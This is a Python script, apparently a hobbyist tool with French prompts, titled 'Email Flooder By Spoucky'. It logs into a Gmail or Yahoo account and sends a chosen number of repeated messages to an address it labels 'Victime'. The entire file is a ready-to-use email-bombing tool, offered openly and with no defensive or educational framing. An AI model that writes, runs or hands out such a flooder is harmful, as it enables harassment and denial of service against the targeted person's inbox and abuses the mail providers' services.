import os, sys, smtplib, getpass


try:

    W = '\033[0m'  #White
    R = '\033[31m' #Red
    G = '\033[32m' #Green


    os.system("clear")
    print ('  ------------------------  ')
    print (' /      *  $$$$$$ *       \ ')
    print ('| Email Flooder By Spoucky |')
    print (' \      *  $$$$$$ *       / ')
    print ('  ------------------------  ')
    print (' ')
    print ('Snap: spoucky.sys')
    print ('Twitter: Spoucky_')
    print (' ')
    server = raw_input ('Ton Email Est Gmail/Yahoo: ')

    if server == 'gmail' or server == 'Gmail':

        smtp_server = 'smtp.gmail.com'
        port = 587
        set_server = "gmail"

    elif server == 'yahoo' or server == 'Yahoo':

        smtp_server = 'smtp.mail.yahoo.com'
        port = 25
        set_server = "yahoo"

    else:

        print(R + "Erreur - C'est soit Gmail ou Yahoo." + W)
        sys.exit()

    email_user = raw_input('Email: ')
    passwd     = getpass.getpass('Mot De Passe: ')
    email_to   = raw_input('\nVictime: ')
    subject    = raw_input('Sujet: ')
    body       = raw_input('Message: ')
    total      = input('Nombre A Envoyer: ')

    try:

        server = smtplib.SMTP(smtp_server,port) 
        server.ehlo()

        if set_server == "gmail":
            server.starttls()

        server.login(email_user,passwd)

        print("\n\n\n - Email : {} -\n".format(email_to))

        for i in range(1, total+1):

            msg = 'From: ' + email_user + '\nSujet: ' + subject + '\n' + body

            server.sendmail(email_user,email_to,msg)

            print(G + "\rEmail Flood - {}".format(i))

            sys.stdout.flush()

        server.quit()

        print( R + "\n\n-Flood OK-" + W)


    except KeyboardInterrupt:

        print(R + "\nErreur - STOP" + W)
        sys.exit()

    except smtplib.SMTPAuthenticationError:

        print( R + "\nErreur - Authentication Failed, Mot de passe ou utilisateur incorrect" + W)
        sys.exit()

except smtplib.SMTPAuthenticationError:

    sys.exit()
